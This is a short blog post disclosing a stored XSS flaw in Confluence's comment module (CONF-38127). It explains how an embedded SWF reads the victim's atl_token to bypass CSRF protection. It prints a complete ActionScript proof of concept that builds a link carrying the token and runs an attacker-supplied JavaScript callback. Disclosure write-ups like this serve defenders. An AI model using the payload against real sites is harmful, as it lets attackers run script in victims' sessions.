---
title: XSS on confluence comment module
date: 2016-05-11 00:00:00 +02:00
categories:
- XSS
- SWF
layout: post
excerpt: On `02/Jul/2015 3:27 AM` i found a XSS flaw on confluence, https://jira.atlassian.com/browse/CONF-38127
comments: true
---

On `02/Jul/2015 3:27 AM` I found a XSS flaw on confluence, https://jira.atlassian.com/browse/CONF-38127

In confluence comment module, User can upload and embed the swf file in their comment. Confluence is using an `atl_token` parameter on GET HTTP request, if the attacker sends the link of .SWF file( the value of src on embed tag) to his victim the malicious SWF file won’t execute on the victim’s browser. Every user has atl_token. This is a CSRF protection and XSS protection too. We can bypass this protection by using `this.loaderInfo.parameters` in malicious .SWF. `this.loaderInfo.parameters.parameter_name` extracts the value of your target parameter, in this case, it `is atl_token`. The attacker must also insert a `<a>` tag in malicious SWF file then append the extracted atl_token to `<a>` tag , so if the victim clicks the link(`<a>`) in our embed SWF file, the .SWF file will be executed in the victim’s browser.

## Payload

{% highlight text %}
package
{
import flash.display.Sprite;
import flash.text.TextFormat;
import flash.text.TextField;
import flash.external.ExternalInterface;

public class Main extends Sprite
{

public function Main()
{
super();
var myFormat:TextFormat = new TextFormat();
myFormat.size = 200;
var xcode:String = this.loaderInfo.parameters.atl_token;
var myText:TextField = new TextField();
myText.width = 1000;
myText.height = 1000;
myText.htmlText = "<font size=\'300px\'> <a target=\'_blank\' href=\'https://pwnie.ninja/confluence/download/attachments/9469955/NewProjectx.swf?atl_token=" + xcode + "&callback=alert\'>CliCK ME</a> </font>";
addChild(myText);
ExternalInterface.call(this.loaderInfo.parameters.callback,"xss");
}
}
}
{% endhighlight %}


## References:
* [Jira Report](https://jira.atlassian.com/browse/CONF-38127)
* [Loaderinfo-parameter-in AS3](http://stackoverflow.com/questions/6057211/loaderinfo-parameters-in-as3)
